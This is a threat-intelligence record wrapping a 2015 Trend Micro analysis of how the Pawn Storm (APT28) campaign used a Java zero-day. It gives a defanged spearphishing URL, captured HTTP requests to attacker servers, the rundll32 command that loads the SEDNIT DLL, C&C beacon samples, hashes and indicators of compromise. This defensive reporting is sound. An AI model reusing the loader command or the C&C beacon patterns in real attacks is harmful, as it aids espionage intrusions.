{
    "id": "4500f39b-c6f7-49e4-aad3-cf5566416392",
    "created_at": "2022-10-25T16:48:17.345841Z",
    "updated_at": "2025-03-27T02:17:11.790321Z",
    "deleted_at": null,
    "sha1_hash": "2fd37e0616a93fb94131cddecbb40e976de62364",
    "title": "An In-Depth Look at How Pawn Storm’s Java Zero-Day Was Used",
    "authors": "",
    "file_creation_date": "2015-10-31T12:08:39Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 595583,
    "plain_text": "**Go to…** **▼**\n\n**[Home  »  Exploits  »  An In-Depth Look at How Pawn Storm’s Java Zero-Day Was Used](http://blog.trendmicro.com/trendlabs-security-intelligence/)** **Featured Stories**\n\n## An In-Depth Look at How Pawn Storm’s Java Zero-Day Was Pawn Storm Targets MH17 Investigation Team Used FBI, Security Vendors Partner for DRIDEX\n\n**Takedown**\n\n**[Posted on: July 14, 2015](http://blog.trendmicro.com/trendlabs-security-intelligence/2015/07/)** **at 9:29** **[Posted in: Exploits,](http://blog.trendmicro.com/trendlabs-security-intelligence/category/exploits/)** **[Malware,](http://blog.trendmicro.com/trendlabs-security-intelligence/category/malware/)** **[Targeted Attacks](http://blog.trendmicro.com/trendlabs-security-intelligence/category/targeted_attacks/)** **Author: Trend**\n**pm** **Micro** **[Japanese Cybercriminals New Addition To](http://blog.trendmicro.com/trendlabs-security-intelligence/japanese-cybercriminals-new-addition-to-underground-arena/)**\n\n**Underground Arena**\n\n**52** **166** **48** **Follow the Data: Dissecting Data Breaches and**\n\n**Debunking the Myths**\n\n**Operation Pawn Storm is a campaign known to target military, embassy, and defense contractor**\n\n**Nigerian Cuckoo Miner Campaign Takes Over**\n\n**personnel from the United States and its allies. The attackers behind Operation Pawn Storm have been** **Legitimate Inboxes, Targets Banks**\n\n**active since at least 2007 and they continue to launch new campaigns.**\n\n**Over the past year or so, we have seen numerous techniques and tactics employed by this campaign,** **Recent Posts**\n**[such as the use of an iOS espionage app, and the inclusion of new targets like the White House.](http://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-update-ios-espionage-app-found/)**\n**Through our on-going investigation and monitoring of this targeted attack campaign, we found** **2016 Predictions: The Fine Line Between Business**\n\n**and Personal**\n\n**suspicious URLs that hosted a newly discovered zero-day exploit in Java now identified by Oracle as**\n\n**[CVE-2015-2590. This is the first time in nearly two years that a new Java zero-day vulnerability](https://blogs.oracle.com/security/entry/july_2015_critical_patch_update)** **was** **[Pornographic-themed Malware Hits Android Users](http://blog.trendmicro.com/trendlabs-security-intelligence/pornographic-themed-malware-hits-android-users-in-china-taiwan-japan/)**\n**reported.** **in China, Taiwan, Japan**\n\n**_The report below outlines the traffic observed as part of the attack, not the exploit itself. Our blog entry_** **[Pawn Storm Targets MH17 Investigation Team](http://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-targets-mh17-investigation-team/)**\n**_[on how the exploit itself works can be found here. This blog entry is intended to help readers identify](http://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-update-trend-micro-discovers-new-java-zero-day-exploit/)_**\n**_traffic in their network that would indicate if such an exposure had occurred. We strongly recommend_** **[New Headaches: How The Pawn Storm Zero-Day](http://blog.trendmicro.com/trendlabs-security-intelligence/new-headaches-how-the-pawn-storm-zero-day-evaded-javas-click-to-play-protection/)**\n\n**Evaded Java’s Click-to-Play Protection**\n\n**_[that all readers roll out the Oracle patch as soon as possible](https://blogs.oracle.com/security/entry/july_2015_critical_patch_update)_**\n\n**[Latest Flash Exploit Used in Pawn Storm](http://blog.trendmicro.com/trendlabs-security-intelligence/latest-flash-exploit-used-in-pawn-storm-circumvents-mitigation-techniques/)**\n\n**_Infection sequence_** **Circumvents Mitigation Techniques**\n\n**Trend Micro has observed that an entity belonging to the target profile received an email that contains**\n**the following URL:**\n\n#### Threat Intelligence: The Deep Web\n\n**hxxp://ausameetings[.]com/url?={BLOCKED}/2015annualmeeting/**\n\n**It is worth noting that the spearphishing domain used is ausameetings[.]com, a play on the valid**\n\n**domain “ausameetings.org,” which is a site for AUSA’s (Association of the United States Army) annual**\n**exposition, commonly held in mid-October. The domain was only registered last July 8, which implies a**\n\n**one-time use for a specific set of targets.**\n\n**When assessing this URL, it was determined that the most probable infection sequence is:**\n\n**The latest research and information on**\n**the deep web and the cybercriminal**\n**underground.**\n**[Learn more about the Deep Web](http://www.trendmicro.com/vinfo/us/security/threat-intelligence-center/deep-web/)**\n\n#### Popular Posts\n\n**[New Adobe Flash Zero-Day Used in Pawn Storm](http://blog.trendmicro.com/trendlabs-security-intelligence/new-adobe-flash-zero-day-used-in-pawn-storm-campaign/)**\n**Campaign Targeting Foreign Affairs Ministries**\n\n**[Latest Flash Exploit Used in Pawn Storm](http://blog.trendmicro.com/trendlabs-security-intelligence/latest-flash-exploit-used-in-pawn-storm-circumvents-mitigation-techniques/)**\n**Circumvents Mitigation Techniques**\n\n**[New Headaches: How The Pawn Storm Zero-Day](http://blog.trendmicro.com/trendlabs-security-intelligence/new-headaches-how-the-pawn-storm-zero-day-evaded-javas-click-to-play-protection/)**\n**Evaded Java’s Click-to-Play Protection**\n\n**[Pawn Storm Targets MH17 Investigation Team](http://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-targets-mh17-investigation-team/)**\n\n**_Figure 1. Infection chain_** **Cybercriminals Improve Android Malware Stealth**\n\n**Routines with OBAD**\n\n**Like all multi-stage infections, a successful execution of the previous stage is required before moving to**\n**the next stage down. In Stage 1, the sequence is initiated by clicking on the URL embedded within the**\n\n#### Latest Tweets\n\n**victim’s spearphishing email.**\n\n**Once the Java exploit of Stage 1 is successful, it downloads the PE file (Stage 2). Once the PE file is** **Fake porn sites lead to #mobile #malware**\n**downloaded and executed it drops and runs the DLL file (Stage 3) which is the final component to infect** **[bit.ly/1P1oGlw](https://t.co/V6BUYy8T7B)**\n\n**[about 4 hours ago](http://twitter.com/TrendLabs/status/660244795080712192)**\n\n**the machine with SEDNIT.**\n\n**#IoT's growing popularity raises safety**\n\n**The information that we have on each of these steps is as follows.** **concerns due to lack of regulation:**\n\n\n-----\n\n**‘Tis the season to be scary. We dressed up**\n**common #threats as #Halloween**\n**[bit.ly/20fiz2c #infosec](https://t.co/70G4Kh4Dtv)**\n\n**Email Subscription**\n\n**Your email here**\n# bb\n\n|Stage|Type|SHA1|File Name|File Size|Trend Micro Detection|Col7|\n|---|---|---|---|---|---|---|\n|Stage 1|Java Exploit|95dc765700f5af406883 d07f165011d2ff8dd0fb|Spearphishing URL matching hxxp://ausameetings[.]com/url? =[a-zA-Z0-9] {7}/2015annualmeeting/||JAVA_DLOADR.E|FD ab|\n|Stage 2|PE|b4a515ef9de037f18d96 b9b0e48271180f5725b7|Drops as cormac.mcr End resulting file on host system as vhgg5hkvn25.exe|1,619,968 bytes|TROJ_DROPPR.|CXC‘T co m|\n|Stage 3|DLL|21835aafe6d46840bb69 7e8b0d4aac06dec44f5b|api-ms-win-downlevel-profile- l1-1-0.dll|40,960 bytes|TSPY_SEDNIT.|C|\n|Stage 1 – the Java exploit The first stage of the infection sequence comes through a targeted, spearphishing attempt against the victim, which is the observed method for Operation Pawn Storm attacks. The initial spearphishing URL is constructed similar to: hxxp://ausameetings[.]com/url?=[a-zA-Z0-9]{7}/2015annualmeeting/ The web pages on this domain that were found to drop the Java zero-day exploit include: 1_2015annualmeeting index.htm (19,225 bytes) – detected as HTML_JNLPER.HAQ|||||||\n\n|Result|Protocol|Host|URL|Size|Content-Type|\n|---|---|---|---|---|---|\n|200|HTTP|ausameetings[.]com|/url?={BLOCKED}/2015annualmeeting/|19,225|text/html; charset=utf-8|\n|200|HTTP|ausameetings[.]com|/VFlmsRH/7311/4388/558923/? p2=KlW2HlMf&c= BMjNiBV&recr=Wr1mI7&p3=364397021& as=SAUmj&c=GY9oCdQ&|22|text/html; charset=utf-8|\n|200|HTTP|ausameetings[.]com|/url/544036/|4,077|text/html; charset=utf-8|\n|200|HTTP|ausameetings[.]com|/url/544036/line.jpg|22,500|text/html; charset=utf-8|\n|200|HTTP|ausameetings[.]com|/url/544036/right.jpg|97,247|text/html; charset=utf-8|\n|200|HTTP|ausameetings[.]com|/url/544036/init.jnlp|562|application/x- java-jnlp-file|\n|200|HTTP|ausameetings[.]com|/url/544036/|4,077|text/html; charset=utf-8|\n|200|HTTP|ausameetings[.]com|/url/544036/jndi.properties|125|text/html; charset=utf-8|\n|404|HTTP|ausameetings[.]com|/url/544036/Go.class|0|text/html; charset=utf-8|\n\n\n**Stage** **Java** **95dc765700f5af406883** **Spearphishing URL matching** **JAVA_DLOADR.EFD**\n\n**1** **Exploit** **d07f165011d2ff8dd0fb** **hxxp://ausameetings[.]com/url?**\n\n**=[a-zA-Z0-9]**\n\n**{7}/2015annualmeeting/** **[about 11 hours ago](http://twitter.com/TrendLabs/status/660139101165875200)**\n\n**Stage** **PE** **b4a515ef9de037f18d96** **Drops as cormac.mcr** **1,619,968** **TROJ_DROPPR.CXC‘Tis the season to be scary. We dressed up**\n\n**common #threats as #Halloween**\n\n**2** **b9b0e48271180f5725b7** **bytes** **[monsters! bit.ly/20fiz2c #infosec](https://t.co/70G4Kh4Dtv)**\n\n**End resulting file on host**\n\n**system as vhgg5hkvn25.exe**\n\n**Stage** **DLL** **21835aafe6d46840bb69** **api-ms-win-downlevel-profile-** **40,960** **[TSPY_SEDNIT.C](http://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/TSPY_SEDNIT.C)**\n\n**3** **7e8b0d4aac06dec44f5b** **l1-1-0.dll** **bytes**\n\n**_Stage 1 – the Java exploit_**\n\n**The first stage of the infection sequence comes through a targeted, spearphishing attempt against the**\n\n**[victim, which is the observed method for Operation Pawn Storm attacks.](http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-operation-pawn-storm.pdf)**\n\n**The initial spearphishing URL is constructed similar to:**\n\n**hxxp://ausameetings[.]com/url?=[a-zA-Z0-9]{7}/2015annualmeeting/**\n\n**The web pages on this domain that were found to drop the Java zero-day exploit include:**\n\n**[about 12 hours ago](http://twitter.com/TrendLabs/status/660131551590621184)**\n\n**1_2015annualmeeting index.htm (19,225 bytes) – detected as HTML_JNLPER.HAQ**\n\n**3_544306 index.htm (4,077 bytes) – detected as HTML_JNLPER.HAQ**\n\n#### Stay Updated\n\n**The network traffic observed for the infection sequence of this stage is:**\n\n**1. Send the initial POST as per the spearphishing email to ausameetings[.]com, which includes the** **Email Subscription**\n\n**_2015annualmeeting URI path._**\n\n**Your email here**\n\n**2. Send an encoded POST call, which, when decoded, is the variable to construct the subsequently**\n\n**used URI path. This is particularly interesting as it appears that each URI path on the malicious**\n\n**server is customized by the victim’s infection, rather than static on the web server.**\n\n**3. The victim machine then does a variety of GET calls to pull down JPG, JNLP, and Java class files.**\n\n**4. If the Java class files cannot be found on the primarily domain ( ausameetings[.]com), it appears to**\n\n**instead attempt to get these files from a hardcoded IP (87[.]236[.]215[.]132).**\n\n**5. Once the class files are downloaded, the victim machine then does a GET call to fetch the file**\n\n**_cormac.mcr. This file is the PE file for Stage 2._**\n\n**For completeness, the specific traffic calls observed relating to Stage 1 include the following:**\n\n**Result** **Protocol** **Host** **URL** **Size** **Content-Type**\n\n**200** **HTTP** **ausameetings[.]com** **/url?={BLOCKED}/2015annualmeeting/** **19,225** **text/html;**\n\n**charset=utf-8**\n\n**200** **HTTP** **ausameetings[.]com** **/VFlmsRH/7311/4388/558923/?** **22** **text/html;**\n\n**p2=KlW2HlMf&c=** **charset=utf-8**\n\n**BMjNiBV&recr=Wr1mI7&p3=364397021&**\n\n**as=SAUmj&c=GY9oCdQ&**\n\n**200** **HTTP** **ausameetings[.]com** **/url/544036/** **4,077** **text/html;**\n\n**charset=utf-8**\n\n**200** **HTTP** **ausameetings[.]com** **/url/544036/line.jpg** **22,500** **text/html;**\n\n**charset=utf-8**\n\n**200** **HTTP** **ausameetings[.]com** **/url/544036/right.jpg** **97,247** **text/html;**\n\n**charset=utf-8**\n\n**200** **HTTP** **ausameetings[.]com** **/url/544036/init.jnlp** **562** **application/x-**\n\n**java-jnlp-file**\n\n**200** **HTTP** **ausameetings[.]com** **/url/544036/** **4,077** **text/html;**\n**charset=utf-8**\n\n**200** **HTTP** **ausameetings[.]com** **/url/544036/jndi.properties** **125** **text/html;**\n\n**charset=utf-8**\n\n**404** **HTTP** **ausameetings[.]com** **/url/544036/Go.class** **0** **text/html;**\n\n**charset=utf-8**\n\n\n-----\n\n|Col1|Col2|Col3|Col4|Col5|charset=utf-8|\n|---|---|---|---|---|---|\n|404|HTTP|87[.]236[.]215[.]132|/crossdomain.xml|0|text/html; charset=utf-8|\n|200|HTTP|87[.]236[.]215[.]132|/2/App.class|7,552|text/html; charset=utf-8|\n|200|HTTP|87[.]236[.]215[.]132|/2/Help.class|5,667|text/html; charset=utf-8|\n|200|HTTP|87[.]236[.]215[.]132|/2/PhantomSuper.class|763|text/html; charset=utf-8|\n|200|HTTP|87[.]236[.]215[.]132|/2/ArrayReplace.class|729|text/html; charset=utf-8|\n|200|HTTP|87[.]236[.]215[.]132|/2/App$PassHandleController.class|980|text/html; charset=utf-8|\n|200|HTTP|87[.]236[.]215[.]132|/2/Converter.class|2,820|text/html; charset=utf-8|\n|200|HTTP|87[.]236[.]215[.]132|/2/MyByteArrayInputStream.class|1,282|text/html; charset=utf-8|\n|404|HTTP|87[.]236[.]215[.]132|/2/pkg/None2.class|0|text/html; charset=utf-8|\n|404|HTTP|87[.]236[.]215[.]132|/2/pkg/None.class|0|text/html; charset=utf-8|\n|200|HTTP|ausameetings[.]com|/url/544036/cormac.mcr|1,619,968|application/octet- stream|\n\n\n**200** **HTTP** **87[.]236[.]215[.]132** **/2/Go.class** **1,373** **text/html;**\n\n**charset=utf-8**\n\n**404** **HTTP** **87[.]236[.]215[.]132** **/crossdomain.xml** **0** **text/html;**\n\n**charset=utf-8**\n\n**200** **HTTP** **87[.]236[.]215[.]132** **/2/App.class** **7,552** **text/html;**\n\n**charset=utf-8**\n\n**200** **HTTP** **87[.]236[.]215[.]132** **/2/Help.class** **5,667** **text/html;**\n**charset=utf-8**\n\n**200** **HTTP** **87[.]236[.]215[.]132** **/2/PhantomSuper.class** **763** **text/html;**\n\n**charset=utf-8**\n\n**200** **HTTP** **87[.]236[.]215[.]132** **/2/ArrayReplace.class** **729** **text/html;**\n\n**charset=utf-8**\n\n**200** **HTTP** **87[.]236[.]215[.]132** **/2/App$PassHandleController.class** **980** **text/html;**\n\n**charset=utf-8**\n\n**200** **HTTP** **87[.]236[.]215[.]132** **/2/Converter.class** **2,820** **text/html;**\n\n**charset=utf-8**\n\n**200** **HTTP** **87[.]236[.]215[.]132** **/2/MyByteArrayInputStream.class** **1,282** **text/html;**\n**charset=utf-8**\n\n**404** **HTTP** **87[.]236[.]215[.]132** **/2/pkg/None2.class** **0** **text/html;**\n**charset=utf-8**\n\n**404** **HTTP** **87[.]236[.]215[.]132** **/2/pkg/None.class** **0** **text/html;**\n\n**charset=utf-8**\n\n**200** **HTTP** **ausameetings[.]com** **/url/544036/cormac.mcr** **1,619,968** **application/octet-**\n\n**stream**\n\n**Trend Micro detects these Java class files as JAVA_DLOADR.EFD:**\n\n**App.class (7,552 bytes)**\n\n**Go.class (1,373 bytes)**\n\n**Help.class (5,667 bytes)**\n\n**The second and third traffic calls in the traffic pattern are particularly interesting to note.**\n\n**_Figure 2. Traffic patterns (click the image to enlarge)_**\n\n**One can observe that the second call sends a POST to ausumeetings[.]com, and is returned with a text**\n**_responsecfa that then subsequently is used as the URI path for the subsequent HTTP requests._**\n\n**_Stage 2 – The PE file_**\n\n**Stage 2 involves downloading a PE file. Trend Micro detects this file as TROJ_DROPPR.CXC. The**\n**primary purpose of this PE is to drop and load the DLL executable. It is downloaded as Cormac.mcr,**\n\n**but once extracted, the file name is converted into a randomized file name. It is installed into**\n\n\n-----\n\n|1|POST /ESL/YxF8bM/f/MFS.pdf/?duJ=OJYKZRlzy1tddcpaKjU= HTTP/1.1 Content-Type: application/x-www-form-urlencoded Host: www.google.com Content-Length: 0 Note: Assumed to be a local connectivity test traffic call.|\n|---|---|\n|2|POST /RGLw/ofEK/5w2a.htm/?6=9SpyZtTPs1iQybJZ54k= HTTP/1.1 Content-Type: application/x-www-form-urlencoded Host: 192[.]111[.]146[.]185 Content-Length: 830|\n|3|POST /hP/Bo/S/2z.htm/?WDC=TJrXZm1/FlgpeRdZXjk= HTTP/1.1 Content-Type: application/x-www-form-urlencoded Host: www.google.com Content-Length: 0 Note: Assumed to be a local connectivity test traffic call.|\n|4|POST /C9zl/LJ9.zip/?hP=mLgAZ7ldwVn9W8BYihs= HTTP/1.1 Content-Type: application/x-www-form-urlencoded Host: 192[.]111[.]146[.]185 Content-Length: 0|\n|5|POST /k9/eR3/a/UE/eR.pdf/?bKC=xCCmnuXFZ6Chw2ah1oM= HTTP/1.1 Content-Type: application/x-www-form-urlencoded Host: 192[.]111[.]146[.]185 Content-Length: 26|\n\n\n**_Figure 3. Observed processes (click the image to enlarge)_**\n\n**Once the malware is executed, it will drop the Stage 3 DLL file with filename** **_api-ms-win-downlevel-_**\n**_profile-l1-1-0.dll in the %TEMP% directory. To load the malware, it executes rundll32.exe using the_**\n**following command:**\n\n**rundll32.exe “%temp%/api-ms-win-downlevel-profile-l1-1-0.dll”,init**\n\n**_Stage 3 – The DLL file_**\n\n**This third stage involves a DLL file, which we detect as TSPY_SEDNIT.C. When the PE file triggers the**\n**DLL (in this instance, %windir%\\system32\\RunDll32.exe Command:**\n**“%windir%\\system32\\RunDll32.exe ” “C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\ap i-ms-win-**\n\n**downlevel-profile-l1-1-0.dll”,init), the following traffic was observed.**\n\n**1** **POST /ESL/YxF8bM/f/MFS.pdf/?duJ=OJYKZRlzy1tddcpaKjU= HTTP/1.1**\n\n**Content-Type: application/x-www-form-urlencoded**\n\n**Host: www.google.com**\n\n**Content-Length: 0**\n**_Note: Assumed to be a local connectivity test traffic call._**\n\n**2** **POST /RGLw/ofEK/5w2a.htm/?6=9SpyZtTPs1iQybJZ54k= HTTP/1.1**\n\n**Content-Type: application/x-www-form-urlencoded**\n\n**Host: 192[.]111[.]146[.]185**\n\n**Content-Length: 830**\n\n**3** **POST /hP/Bo/S/2z.htm/?WDC=TJrXZm1/FlgpeRdZXjk= HTTP/1.1**\n\n**Content-Type: application/x-www-form-urlencoded**\n\n**Host: www.google.com**\n\n**Content-Length: 0**\n**_Note: Assumed to be a local connectivity test traffic call._**\n\n**4** **POST /C9zl/LJ9.zip/?hP=mLgAZ7ldwVn9W8BYihs= HTTP/1.1**\n\n**Content-Type: application/x-www-form-urlencoded**\n\n**Host: 192[.]111[.]146[.]185**\n\n**Content-Length: 0**\n\n**5** **POST /k9/eR3/a/UE/eR.pdf/?bKC=xCCmnuXFZ6Chw2ah1oM= HTTP/1.1**\n\n**Content-Type: application/x-www-form-urlencoded**\n\n**Host: 192[.]111[.]146[.]185**\n\n**Content-Length: 26**\n\n**It bears stressing that we do not encourage using the data presented above as IOCs for your own**\n\n**analysis. The network traffic generated by this stage was a challenge to assess as it appears to have**\n**polymorphic capabilities in the creation of URI paths utilized to pull down files. After assessing the**\n**samples multiple times, each network traffic infection sequence appeared to be different, no matter**\n\n**what sequence of testing was performed (e.g., same machine, different machines, different geographic**\n**IP space globally, etc.).**\n\n**After detailed network forensics of the traffic, it was determined that no single stable URL path or URI**\n**query component (URI path component, file name, or URI query parameter) showed a consistent**\n**pattern (either same entry nor regex definable pattern), and further reverse engineering was required to**\n\n**determine the methods used to achieve this.**\n\n**As a result of this additional analysis, it was determined that the URI path is a random generated string**\n\n**with the following pattern:**\n\n**^/([a-zA-Z0-9]{1,6}/){1,5}[a-zA-Z0-9]{1,7}\\.(xml|pdf|htm|zip)/\\?[a-zA-Z0-9]{1,3}=<Encoded ID>**\n\n\n-----\n\n|Stage|Type|Indicator|Precision|\n|---|---|---|---|\n|Infection Sequence – Stage 1|Domain|ausameetings[.]com|High|\n|Infection Sequence – Stage 1|Domain_IP|95[.]215[.]45[.]189|Low|\n\n\n**_Figure 4. Regex expression_**\n\n**Included in the POST request is a data encoded with Base64 and XOR encryption. The encoded data**\n**contains the following system information of the infected machine:**\n\n**OS Version**\n\n**List of running processes**\n\n**Hard Disk Drive Information**\n\n**Volume Serial Number**\n\n**TSPY_SEDNIT.C connects to three C&C servers:**\n\n**192[.]111[.]146[.]185 (direct to IP call)**\n\n**www[.]acledit[.]com**\n\n**www[.]biocpl[.]org**\n\n**After sending the encrypted data it will wait for a reply which is encrypted by the same algorithm above.**\n\n**_Phase 2 of the attack: the keystroke logger_**\n\n**Based on our investigation of Operation Pawn Storm, we know that the infection happens in two**\n**stages:**\n\n**In phase 1, opening the email attachment or clicking on the malicious URI initiates the download of**\n**the first level dropper, which installs the downloader component (.DLL file).**\n\n**In phase 2, the downloader component communicates with a C&C server and downloads other**\n\n**components, and at the end of the chain a keylogger is installer. The keylogger sends data back to**\n**the C&C server.**\n\n**As of writing, we have not succeeded in triggering Phase 2, which will download a fourth stage**\n**malware from the C&C servers. This fourth stage malware is expected to be an encrypted executable**\n**file.**\n\n**_Victims of the Attack_**\n\n**A number of victims were identified during the course of our investigation. The targets are in the United**\n\n**States or Canada, and those we were able to identify via IP are big defense contractors, as typical for**\n**Operation PawnStorm.**\n\n**_Countermeasures_**\n\n**Trend Micro is already able to protect users against this threat without any necessary updates. The**\n**[existing Sandbox with Script Analyzer engine, which is part of Trend Micro™ Deep Discovery, can be](http://www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/http:/www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/)**\n\n**used to detect this threat by its behavior. The Browser Exploit Prevention feature in the Endpoint**\n**[Security in Trend Micro™ Smart Protection Suite detects the exploit once the user accesses the URL](http://www.trendmicro.com/us/business/complete-user-protection/)**\n**that hosted it. Our Browser Exploit Prevention detects user systems against exploits targeting browsers**\n\n**or related plugins.**\n\n**[Vulnerability protection in Trend Micro Deep Security protects user systems from threats that may](http://www.trendmicro.com/us/business/cloud-data/index.html)**\n\n**leverage this vulnerability with the following DPI rule:**\n\n**1006857 – Oracle Java SE Remote Code Execution Vulnerability**\n\n**Oracle has also provided** **[a security patch for the related vulnerability.](http://blog.trendmicro.com/trendlabs-security-intelligence/oracle-patches-java-zero-day-used-in-operation-pawn-storm/)**\n\n**_Indicators of Compromise_**\n\n**The following table summarizes the identified stable IOCs that can be used to search for this attack.**\n**The “Precision” column indicates how close to the direct parameter the indicator is, inversely indicating**\n\n**likelihood of collateral false positives.**\n\n**Stage** **Type** **Indicator** **Precision**\n\n**Infection Sequence – Stage** **Domain** **ausameetings[.]com** **High**\n\n**1**\n\n**Infection Sequence – Stage** **Domain_IP** **95[.]215[.]45[.]189** **Low**\n\n**1**\n\n**Infection Sequence – Stage** **IP** **87[.]236[.]215[.]132** **High**\n\n\n-----\n\n|Infection Sequence – Stage 1|URIPath_FileName|ArrayReplace.class|Medium|\n|---|---|---|---|\n|Infection Sequence – Stage 1|URIPath_FileName|App$PassHandleController.class|Medium|\n|Infection Sequence – Stage 1|URIPath_FileName|Converter.class|Medium|\n|Infection Sequence – Stage 1|URIPath_FileName|MyByteArrayInputStream.class|Medium|\n|Infection Sequence – Stage 1|URIPath_FileName|None2.class|Medium|\n|Infection Sequence – Stage 1|URIPath_FileName|None.class|Medium|\n|Infection Sequence – Stage 1->2|URIPath_FileName|cormac.mcr|High|\n|Infection Sequence – Stage 3||192[.]111[.]146[.]185|High|\n|Infection Sequence – Stage 3|IP_DirectCall|37[.]187[.]116[.]240|High|\n|Infection Sequence – Stage 3|Domain|www[.]acledit[.]com|High|\n|Infection Sequence – Stage 3|Domain|www[.]biocpl[.]org|High|\n\n\n**Infection Sequence – Stage** **URIPath_FileName** **App$PassHandleController.class** **Medium**\n\n**1**\n\n**Infection Sequence – Stage** **URIPath_FileName** **Converter.class** **Medium**\n\n**1**\n\n**Infection Sequence – Stage** **URIPath_FileName** **MyByteArrayInputStream.class** **Medium**\n\n**1**\n\n**Infection Sequence – Stage** **URIPath_FileName** **None2.class** **Medium**\n\n**1**\n\n**Infection Sequence – Stage** **URIPath_FileName** **None.class** **Medium**\n\n**1**\n\n**Infection Sequence – Stage** **URIPath_FileName** **cormac.mcr** **High**\n\n**1->2**\n\n**Infection Sequence – Stage** **192[.]111[.]146[.]185** **High**\n\n**3**\n\n**Infection Sequence – Stage** **IP_DirectCall** **37[.]187[.]116[.]240** **High**\n\n**3**\n\n**Infection Sequence – Stage** **Domain** **www[.]acledit[.]com** **High**\n\n**3**\n\n**Infection Sequence – Stage** **Domain** **www[.]biocpl[.]org** **High**\n\n**3**\n\n**Other posts related to Operation Pawn Storm can be found here:**\n\n**[Pawn Storm Update: Trend Micro Discovers New Java Zero-Day Exploit](http://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-update-trend-micro-discovers-new-java-zero-day-exploit/)**\n\n**[Pawn Storm Espionage Attacks Use Decoys, Deliver SEDNIT](http://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/pawn-storm-espionage-attacks-use-decoys-deliver-sednit)**\n\n**[Operation Pawn Storm: Putting Outlook Web Access Users at Risk](http://blog.trendmicro.com/trendlabs-security-intelligence/operation-pawn-storm-putting-outlook-web-access-users-at-risk/)**\n\n**[Pawn Storm Update: iOS Espionage App Found](http://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-update-ios-espionage-app-found/)**\n\n**[Operation Pawn Storm Ramps Up its Activities; Targets NATO, White House](http://blog.trendmicro.com/trendlabs-security-intelligence/operation-pawn-storm-ramps-up-its-activities-targets-nato-white-house/)**\n\n**[Pawn Storm: First Java Zero-Day Attack in Two Years Targets NATO & US Defense Organizations](http://blog.trendmicro.com/pawn-storm-first-java-zero-day-attack-in-two-years-targets-nato-us-defense-organizations/)**\n\n**_Updated on July 15, 2015, 9:57AM PDT (UTC-7) to include revised detection name for DLL file and_**\n**_clarifications to the infection flow._**\n\n**_Updated on July 15, 2015, 1:15PM PDT (UTC-7) to include more details about the infection flow._**\n\n**_Updated on July 16, 2015 1:36PM PDT (UTC-7) to include screenshots of running processes._**\n\n### Related Posts:\n\n**[Analyzing the Pawn Storm Java Zero-Day – Old Techniques Reused](http://blog.trendmicro.com/trendlabs-security-intelligence/analyzing-the-pawn-storm-java-zero-day-old-techniques-reused/)**\n\n**[Pawn Storm C&C Redirects to Trend Micro IP Address](http://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-cc-redirects-to-trend-micro-ip-address/)**\n\n**[Oracle Patches Java Zero-Day Used in Operation Pawn Storm](http://blog.trendmicro.com/trendlabs-security-intelligence/oracle-patches-java-zero-day-used-in-operation-pawn-storm/)**\n\n**[New Headaches: How The Pawn Storm Zero-Day Evaded Java’s Click-to-Play Protection](http://blog.trendmicro.com/trendlabs-security-intelligence/new-headaches-how-the-pawn-storm-zero-day-evaded-javas-click-to-play-protection/)**\n\n**Tags:** **[APT28](http://blog.trendmicro.com/trendlabs-security-intelligence/tag/apt28/)** **[CVE-2015-2590](http://blog.trendmicro.com/trendlabs-security-intelligence/tag/cve-2015-2590/)**\n\n**java zero-**\n\n\n-----\n\n**[HOME AND HOME OFFICE](http://www.trendmicro.com/us/home/index.html)** **|** **[FOR BUSINESS](http://www.trendmicro.com/us/business/index.html)** **|** **[SECURITY INTELLIGENCE](http://www.trendmicro.com/us/security-intelligence/index.html)** **|** **[ABOUT TREND MICRO](http://www.trendmicro.com/us/about-us/index.html)**\n\n**[Asia Pacific Region (APAC): Australia / New Zealand, 中国, ⽇本, 대한민국](http://www.trendmicro.com.au/au/home/index.html)** **[, 台灣](http://tw.trendmicro.com/tw/home/index.html)** **[Latin America Region (LAR): Brasil, México](http://br.trendmicro.com/br/home/index.html)** **[North America Region (NABU): United States, Canada](http://www.trendmicro.com/us/index.html)**\n\n**[Europe, Middle East, & Africa Region (EMEA): France, Deutschland / Österreich / Schweiz, Italia, Россия, España, United Kingdom / Ireland](http://www.trendmicro.fr/)**\n\n**[Privacy Statement](http://www.trendmicro.com/us/about-us/legal-policies/privacy-statement/index.html)** **[Legal Policies](http://www.trendmicro.com/us/about-us/legal-policies/index.html)** **Copyright © 2015 Trend Micro Incorporated. All rights reserved.**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2015/2015.07.14.How_Pawn_Storm_Java_Zero-Day_Was_Used/an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used.pdf"
    ],
    "report_names": [
        "an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
